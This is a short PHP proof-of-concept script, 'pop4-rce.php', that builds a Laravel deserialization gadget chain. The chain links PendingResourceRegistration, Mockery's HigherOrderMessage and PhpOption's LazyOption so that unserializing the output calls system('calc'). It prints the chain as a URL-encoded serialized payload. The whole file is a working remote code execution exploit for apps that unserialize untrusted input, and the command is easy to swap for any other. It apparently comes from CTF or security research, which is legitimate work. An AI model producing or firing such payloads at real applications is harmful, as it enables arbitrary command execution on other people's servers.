<?php
/*
# -*- coding: utf-8 -*-
# @filename: pop4-rce.php
# @author: diggid
*/
namespace Illuminate\Routing{
    class PendingResourceRegistration{
        protected $registered = false;
        protected $registrar;
        protected $controller = "diggid";
        protected $options = "diggid";
        public function __construct($a)
        {
            $this->registrar = $a;
        }
    }
}
namespace Mockery {
    class HigherOrderMessage{
        private $mock;
        private $method;
        public function __construct($a, $b)
        {
            $this->mock = $a;
            $this->method = $b;
        }
    }
}

namespace PhpOption{
    final class LazyOption{
        private $callback;
        private $arguments;
        private $option;

        public function __construct($callback, $arguments, $option)
        {
            $this->callback = $callback;
            $this->arguments = $arguments;
            $this->option = $option;
        }
    }
}
namespace {
    $a = new PhpOption\LazyOption("system", array("calc"), null);
    $b = new Mockery\HigherOrderMessage($a, "filter");
    $c = new Illuminate\Routing\PendingResourceRegistration($b);
    echo urlencode(serialize($c));
}
